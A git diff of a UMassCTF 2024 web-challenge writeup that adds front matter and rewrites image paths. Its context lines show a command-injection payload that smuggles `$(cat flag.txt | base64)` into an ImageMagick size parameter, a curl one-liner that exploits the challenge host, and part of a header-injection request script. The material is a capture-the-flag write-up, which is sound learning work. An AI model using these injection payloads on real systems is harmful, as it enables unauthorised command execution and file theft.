@@ -1,6 +1,16 @@
+---
+date: 2024-04-22
+description: CMD injection, HTTP, Header injection
+platform: 
+categories: Web
+tags:
+  - code-review
+  - go
+duration:
+---
 # UMassCTF 2024 Writeups
 
-Writeups for solved [UMassCTF 2024](https://ctftime.org/event/2287) web challenges (3/5)
+Writeups for solved [UMassCTF 2024](_attachments/https://ctftime.org/event/2287) web challenges (3/5)
 
 ---
  
@@ -9,7 +19,7 @@ Writeups for solved [UMassCTF 2024](https://ctftime.org/event/2287) web challeng
 
 There is a `#command-injection` in the `/assets/image` path in `size` query parameter. The size is passed on to the **convert-im6.q16** command. When I tried various command injection payloads, it resulted in an error.
 
-![Alt text](images/error.png)
+![Alt text](_attachments/error.png)
 
 During my tries, I wasn't able to escape from the current command, so I just looked for available arguments. I learned can use `-set` argument in convert-im6.q16 to set meta tags to the image. This resulted to the following payload: `200 -set Flag "$(cat flag.txt | base64)"`. Encoding in base64 is not really required for this challenge.
 
@@ -17,7 +27,7 @@ During my tries, I wasn't able to escape from the current command, so I just loo
 
 We can download the image rendered and view using exiftool and decode from base64
 
-![Alt text](images/metadata.png)
+![Alt text](_attachments/metadata.png)
 
 ```bash
 curl -s 'http://spongebob-blog.ctf.umasscybersec.org/assets/image?name=spongebob&size=200%20-set%20Flag%20%22$(cat%20flag.txt%20|%20base64)%22' | exiftool - | grep Flag | cut -d ':' -f 2 | tr -d '!' | xargs | base64 -d 
@@ -228,6 +238,6 @@ r = requests.get("http://holesomebirthdayparty.ctf.umasscybersec.org/", headers=
 print(r.text)
 ```
 
-{{< image src="holesome.png" width="100%">}}
+![Alt text](_attachments/holesome.png)
 
 flag: **UMASS{B3k3nIwH3rLP0oL~}**
